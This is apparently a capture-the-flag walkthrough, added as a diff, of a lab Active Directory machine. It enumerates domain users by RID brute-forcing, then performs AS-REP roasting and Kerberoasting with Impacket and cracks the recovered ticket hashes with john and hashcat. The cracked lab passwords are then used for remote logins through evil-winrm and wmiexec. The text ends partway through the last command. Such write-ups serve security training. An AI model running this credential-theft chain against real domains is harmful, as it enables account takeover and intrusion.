@@ -698,3 +698,704 @@ With an anonymous null session you can access the IPC$ share and interact with s
 
 -   Details of the parent domain
     
+
+-   A list of local users and groups
+    
+
+-   Details of available SMB shares
+    
+
+-   The effective system security policy
+
+https://book.hacktricks.xyz/windows-hardening/ntlm
+
+two ways to enum users(using crackmapexec and impacket (lookupsid.py))
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ sudo crackmapexec smb 10.10.129.88 -u 'guest' -p '' --rid-brute
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                 
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)                                                                                                             
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)                                                                                                            
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)                                                                                                            
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                 
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)                                                                                                  
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
+SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
+
+or
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ impacket-lookupsid vulnnet-rst.local/guest@10.10.129.88 
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 10.10.129.88
+[*] StringBinding ncacn_np:10.10.129.88[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
+498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: VULNNET-RST\Administrator (SidTypeUser)
+501: VULNNET-RST\Guest (SidTypeUser)
+502: VULNNET-RST\krbtgt (SidTypeUser)
+512: VULNNET-RST\Domain Admins (SidTypeGroup)
+513: VULNNET-RST\Domain Users (SidTypeGroup)
+514: VULNNET-RST\Domain Guests (SidTypeGroup)
+515: VULNNET-RST\Domain Computers (SidTypeGroup)
+516: VULNNET-RST\Domain Controllers (SidTypeGroup)
+517: VULNNET-RST\Cert Publishers (SidTypeAlias)
+518: VULNNET-RST\Schema Admins (SidTypeGroup)
+519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
+520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
+521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
+522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
+525: VULNNET-RST\Protected Users (SidTypeGroup)
+526: VULNNET-RST\Key Admins (SidTypeGroup)
+527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
+553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
+571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
+572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
+1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
+1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
+1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
+1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
+1105: VULNNET-RST\a-whitehat (SidTypeUser)
+1109: VULNNET-RST\t-skid (SidTypeUser)
+1110: VULNNET-RST\j-goldenhand (SidTypeUser)
+1111: VULNNET-RST\j-leet (SidTypeUser)
+
+or
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.129.88 | tee users.txt
+Password:
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Brute forcing SIDs at 10.10.129.88
+[*] StringBinding ncacn_np:10.10.129.88[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
+498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: VULNNET-RST\Administrator (SidTypeUser)
+501: VULNNET-RST\Guest (SidTypeUser)
+502: VULNNET-RST\krbtgt (SidTypeUser)
+512: VULNNET-RST\Domain Admins (SidTypeGroup)
+513: VULNNET-RST\Domain Users (SidTypeGroup)
+514: VULNNET-RST\Domain Guests (SidTypeGroup)
+515: VULNNET-RST\Domain Computers (SidTypeGroup)
+516: VULNNET-RST\Domain Controllers (SidTypeGroup)
+517: VULNNET-RST\Cert Publishers (SidTypeAlias)
+518: VULNNET-RST\Schema Admins (SidTypeGroup)
+519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
+520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
+521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
+522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
+525: VULNNET-RST\Protected Users (SidTypeGroup)
+526: VULNNET-RST\Key Admins (SidTypeGroup)
+527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
+553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
+571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
+572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
+1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
+1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
+1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
+1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
+1105: VULNNET-RST\a-whitehat (SidTypeUser)
+1109: VULNNET-RST\t-skid (SidTypeUser)
+1110: VULNNET-RST\j-goldenhand (SidTypeUser)
+1111: VULNNET-RST\j-leet (SidTypeUser)
+
+formtatting
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat users.txt | grep SidTypeUser
+500: VULNNET-RST\Administrator (SidTypeUser)
+501: VULNNET-RST\Guest (SidTypeUser)
+502: VULNNET-RST\krbtgt (SidTypeUser)
+1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
+1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
+1105: VULNNET-RST\a-whitehat (SidTypeUser)
+1109: VULNNET-RST\t-skid (SidTypeUser)
+1110: VULNNET-RST\j-goldenhand (SidTypeUser)
+1111: VULNNET-RST\j-leet (SidTypeUser)
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat users.txt | grep SidTypeUser | awk '{print $1}'
+500:
+501:
+502:
+1000:
+1104:
+1105:
+1109:
+1110:
+1111:
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat users.txt | grep SidTypeUser | awk '{print $3}'
+(SidTypeUser)
+(SidTypeUser)
+(SidTypeUser)
+(SidTypeUser)
+(SidTypeUser)
+(SidTypeUser)
+(SidTypeUser)
+(SidTypeUser)
+(SidTypeUser)
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat users.txt | grep SidTypeUser | awk '{print $2}'
+VULNNET-RST\Administrator
+VULNNET-RST\Guest
+VULNNET-RST\krbtgt
+VULNNET-RST\WIN-2BO8M1OE1M1$
+VULNNET-RST\enterprise-core-vn
+VULNNET-RST\a-whitehat
+VULNNET-RST\t-skid
+VULNNET-RST\j-goldenhand
+VULNNET-RST\j-leet
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat users.txt | grep SidTypeUser | awk '{print $2}' | cut -d "\\" -f1
+VULNNET-RST
+VULNNET-RST
+VULNNET-RST
+VULNNET-RST
+VULNNET-RST
+VULNNET-RST
+VULNNET-RST
+VULNNET-RST
+VULNNET-RST
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat users.txt | grep SidTypeUser | awk '{print $2}' | cut -d "\\" -f2
+Administrator
+Guest
+krbtgt
+WIN-2BO8M1OE1M1$
+enterprise-core-vn
+a-whitehat
+t-skid
+j-goldenhand
+j-leet
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat users.txt | grep SidTypeUser | awk '{print $2}' | cut -d "\\" -f2 > format_users.txt
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat format_users.txt                                                                    
+Administrator
+Guest
+krbtgt
+WIN-2BO8M1OE1M1$
+enterprise-core-vn
+a-whitehat
+t-skid
+j-goldenhand
+j-leet
+
+Alexa Whitehat (i.e. a-whitehat)  
+Jack Goldenhand (i.e. j-goldenhand)  
+Tony Skid (i.e. t-skid)  
+Johnny Leet (i.e. j-leet)
+
+ASREPRoasting
+
+ASReproasting occurs when a user account has the privilege “_Does not require Pre-Authentication_” set. This means that the account does not not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
+
+We can retrieve Kerberos tickets using a tool called “**GetNPUsers.py**” in [Impacket](https://github.com/SecureAuthCorp/impacket). This allows us to query ASREProastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames, which we enumerated previously during our SMB enumeration.
+
+Now, let’s use GetNPUsers.py to find users without Kerberos pre-authentication
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.129.88 -usersfile format_users.txt -no-pass -request -outputfile kerberos-users-found
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ ls
+Business-Manager.txt   Business-Tracking.txt      Enterprise-Safety.txt  format_users.txt      users.txt
+Business-Sections.txt  Enterprise-Operations.txt  Enterprise-Sync.txt    kerberos-users-found
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat kerberos-users-found 
+$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3d3082fd1c2c6385d75e60333f829eec$86df35297f9cf61ae87137e3113f99a246a12fe1ca2af5e411c139d7c0be0045d22705095418d4a82f381db5b1a6348b79522381e40e320acc53a62e4479a88de5042f3f1eea6aaf8cabeee0d5113c592ff95a15be90b7b21571ce932b80f7d9c2abbd3b37960cc8185ec4e63219f15f1ccb4e9b59b22d6683c1431fd059f4bdc08e89cc69e51dd216c5d73d9112eae49f97b4c3bb4cb240030d1bb9d090fa56421d872b2ab72ee434ec0ac3e5e34b919fb71a42858b02e6bc514feddb58299ad660065c8496e089327bb5a85e81d1f77e2742912fb9f23e91ddd7e06064a58c15aee8dc82bcaad19b67b89e88a49b5665f766952f87
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found       
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
+1g 0:00:00:04 DONE (2022-12-30 14:50) 0.2136g/s 679165p/s 679165c/s 679165C/s tj3929..tj0216044
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+or using hashcat
+
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+El _KDC_ (Key Distribution Center), el servicio de _Kerberos_ encargado de distribuir los tickets a los clientes
+
+we can use hashcat to crack the “_Kerberos 5 AS-REP type 23_” hash retrieved from the KDC
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ hashcat -m 18200 -a 0 kerberos-users-found /usr/share/wordlists/rockyou.txt -o cracked_skid.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3d3082fd1c2c...952f87
+Time.Started.....: Fri Dec 30 14:59:25 2022 (6 secs)
+Time.Estimated...: Fri Dec 30 14:59:31 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   567.9 kH/s (0.98ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3178496/14344385 (22.16%)
+Rejected.........: 0/3178496 (0.00%)
+Restore.Point....: 3177472/14344385 (22.15%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: tjamaalb -> tj030499
+Hardware.Mon.#1..: Util: 44%
+
+Started: Fri Dec 30 14:58:29 2022
+Stopped: Fri Dec 30 14:59:33 2022
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat cracked_skid.txt    
+$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3d3082fd1c2c6385d75e60333f829eec$86df35297f9cf61ae87137e3113f99a246a12fe1ca2af5e411c139d7c0be0045d22705095418d4a82f381db5b1a6348b79522381e40e320acc53a62e4479a88de5042f3f1eea6aaf8cabeee0d5113c592ff95a15be90b7b21571ce932b80f7d9c2abbd3b37960cc8185ec4e63219f15f1ccb4e9b59b22d6683c1431fd059f4bdc08e89cc69e51dd216c5d73d9112eae49f97b4c3bb4cb240030d1bb9d090fa56421d872b2ab72ee434ec0ac3e5e34b919fb71a42858b02e6bc514feddb58299ad660065c8496e089327bb5a85e81d1f77e2742912fb9f23e91ddd7e06064a58c15aee8dc82bcaad19b67b89e88a49b5665f766952f87:tj072889*
+
+Kerberoasting
+
+Now that I have a set of standard user credentials, I started looking for supported **Service Principal Name’s (SPN’s)** and get **Ticket Granting Service (TGS)** for the SPN using “**GetUserSPNs**” tool from Impacket.
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ GetUserSPNs.py vulnnet-rst.local/t-skid:tj072889* -dc-ip 10.10.129.88 -request
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
+----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
+CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             
+
+$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$cccf0ecfd900c84f2ff97ada6b44cb74$c0fe5cf6d16b1e2b16cc4dab74ab8591ce15b2e3263099b65da8d9eaf0adb4373ea5c1f8578f0709d3e046196a9e4cae6be6516fdaddc842744799790214dbd512dc3bbc7775e5812f7022a3d6ef2380d5561fa02e7c2a42ffc8ca65c140a768b93bf78c873b8ad77b78f26f678907ad73c2890f9cdd4f55e42cc483295782ebfba84e22471c9121d609f58fc3689456c354502487f338e77d3109ab69cdff87c73bd6d90391a1e252df3bf45132133c8cb7440c5e724e5b176489dbb117cc9b88e072dc28947a8d3271555ce141ad15142a5f1ad6f81c85ad67c3c8fe8946dbdba6f15318e511bf8f21261240531e3a8fe5f9bd2e97f1dd7e46d568946fec94be3fca048c7b1e71b9b5ac81586aa3db54b36b693fd5dfc5ae509c26f977beb20fe579971116606ceba00745efa89c6448aed353dbebf338a9680e858de99e329cbd50c760d542dc01f7c1e607e9a9a0a666192d52f8f148a4156e38aa61620b463188106a600120ad843db0826c5cba40b7d5517bc78397ac2a56a7e6e6b8d70684a3785e7c323dc990e90db71583e06e12a746e4dea9002a7ea9ba88ef947396ac0660627e91706108fa2cf89978d748d33e508f948dafa562b9490635aae624f755a97e42f7c8f07e3448e4ee27f9efba7e86916cd7864257683cfd01c57bf54c3d282fa7c5695547109bedb1194562fd065b8789e33a5babcac53dd737d7b050bb8cfe82d91d01571b577420a04093ca7af67653340d7be6d037bc72c72ee1495e5de5e578169ba3d93344d66adc5f73f55e5ce0779d9c259a5076f71068c877e769bfa11aa540704bd7b24d8492573941f7b5ec8122b1d1da84c904bd8af46d9185f2bf14095971e85e62bb6dd5d551b1faed46d4661dd7b6278e3a6b67aed0829ec1c1efa83bd0fe47bb19a9bef3978b3e40d47d970666d739c7fd86ffb58a697906a1d2382e7bdfa578580ed4393b04e1c16bec3f5ecf8a411221ba0150c176a54b9fc9608c6749c5725255d6610a521485754fbd8ee590c3491f3b6625aa244065cfa9a4b03c70318e8da8d5f547b50b7bbf347be976568142a4ddaea71cfa2043d1bfcf691483822addf1bf334fba119d33129093daec0450dca995daa491ade9622171d5bddac26bea0639dc1967fb043a62b0545cf10ed1d48f1cd9042fb0806a0a7501696bb4ff132fafc7b4c923f726157cf02c26600651a86319c52ad7efd9746245cadb808285f897bf16e2153c0afd03d53d6de00ece58687a192db2c5f6fdbbc9400a89a0cd801f174c87b212ed0f603826795c3a027e807703806b6c3a3674076b552aefeff27c9933d70791e674982ed5cf87037f2981e8667482a3a9ad96bedad177f1095535c6df0bbf8879de54cff5e8f4dc
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ nano enterprise-hash
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt enterprise-hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ry=ibfkfv,s6h,   (?)     
+1g 0:00:00:03 DONE (2022-12-30 15:07) 0.2824g/s 1160Kp/s 1160Kc/s 1160KC/s ryan2lauren..ry=iIyD{N
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+or using hashcat
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ hashcat -m 13100 -a 0 enterprise-hash /usr/share/wordlists/rockyou.txt -o cracked_enterprise.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$v...e8f4dc
+Time.Started.....: Fri Dec 30 15:09:10 2022 (11 secs)
+Time.Estimated...: Fri Dec 30 15:09:21 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   450.1 kH/s (1.10ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4109312/14344385 (28.65%)
+Rejected.........: 0/4109312 (0.00%)
+Restore.Point....: 4108288/14344385 (28.64%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: ry=iu0if] -> rwtf32
+Hardware.Mon.#1..: Util: 41%
+
+Started: Fri Dec 30 15:08:33 2022
+Stopped: Fri Dec 30 15:09:22 2022
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ cat cracked_enterprise.txt 
+$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$cccf0ecfd900c84f2ff97ada6b44cb74$c0fe5cf6d16b1e2b16cc4dab74ab8591ce15b2e3263099b65da8d9eaf0adb4373ea5c1f8578f0709d3e046196a9e4cae6be6516fdaddc842744799790214dbd512dc3bbc7775e5812f7022a3d6ef2380d5561fa02e7c2a42ffc8ca65c140a768b93bf78c873b8ad77b78f26f678907ad73c2890f9cdd4f55e42cc483295782ebfba84e22471c9121d609f58fc3689456c354502487f338e77d3109ab69cdff87c73bd6d90391a1e252df3bf45132133c8cb7440c5e724e5b176489dbb117cc9b88e072dc28947a8d3271555ce141ad15142a5f1ad6f81c85ad67c3c8fe8946dbdba6f15318e511bf8f21261240531e3a8fe5f9bd2e97f1dd7e46d568946fec94be3fca048c7b1e71b9b5ac81586aa3db54b36b693fd5dfc5ae509c26f977beb20fe579971116606ceba00745efa89c6448aed353dbebf338a9680e858de99e329cbd50c760d542dc01f7c1e607e9a9a0a666192d52f8f148a4156e38aa61620b463188106a600120ad843db0826c5cba40b7d5517bc78397ac2a56a7e6e6b8d70684a3785e7c323dc990e90db71583e06e12a746e4dea9002a7ea9ba88ef947396ac0660627e91706108fa2cf89978d748d33e508f948dafa562b9490635aae624f755a97e42f7c8f07e3448e4ee27f9efba7e86916cd7864257683cfd01c57bf54c3d282fa7c5695547109bedb1194562fd065b8789e33a5babcac53dd737d7b050bb8cfe82d91d01571b577420a04093ca7af67653340d7be6d037bc72c72ee1495e5de5e578169ba3d93344d66adc5f73f55e5ce0779d9c259a5076f71068c877e769bfa11aa540704bd7b24d8492573941f7b5ec8122b1d1da84c904bd8af46d9185f2bf14095971e85e62bb6dd5d551b1faed46d4661dd7b6278e3a6b67aed0829ec1c1efa83bd0fe47bb19a9bef3978b3e40d47d970666d739c7fd86ffb58a697906a1d2382e7bdfa578580ed4393b04e1c16bec3f5ecf8a411221ba0150c176a54b9fc9608c6749c5725255d6610a521485754fbd8ee590c3491f3b6625aa244065cfa9a4b03c70318e8da8d5f547b50b7bbf347be976568142a4ddaea71cfa2043d1bfcf691483822addf1bf334fba119d33129093daec0450dca995daa491ade9622171d5bddac26bea0639dc1967fb043a62b0545cf10ed1d48f1cd9042fb0806a0a7501696bb4ff132fafc7b4c923f726157cf02c26600651a86319c52ad7efd9746245cadb808285f897bf16e2153c0afd03d53d6de00ece58687a192db2c5f6fdbbc9400a89a0cd801f174c87b212ed0f603826795c3a027e807703806b6c3a3674076b552aefeff27c9933d70791e674982ed5cf87037f2981e8667482a3a9ad96bedad177f1095535c6df0bbf8879de54cff5e8f4dc:ry=ibfkfv,s6h,
+
+now using evil-winrm
+
+┌──(root㉿kali)-[/home/kali/VulnNet]
+└─# evil-winrm -i 10.10.169.84 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -N
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completion is disabled
+
+Info: Establishing connection to remote endpoint
+
+^C
+
+Warning: Press "y" to exit, press any other key to continue
+
+Info: Exiting...
+```
+```text
+┌──(kali㉿kali)-[~/VulnNet]
+└─$ sudo impacket-wmiexec  vulnnet-rst.local/enterprise-core-vn:ry=ibfkfv,s6h,@10.10.169.84
+[sudo] password for kali: 
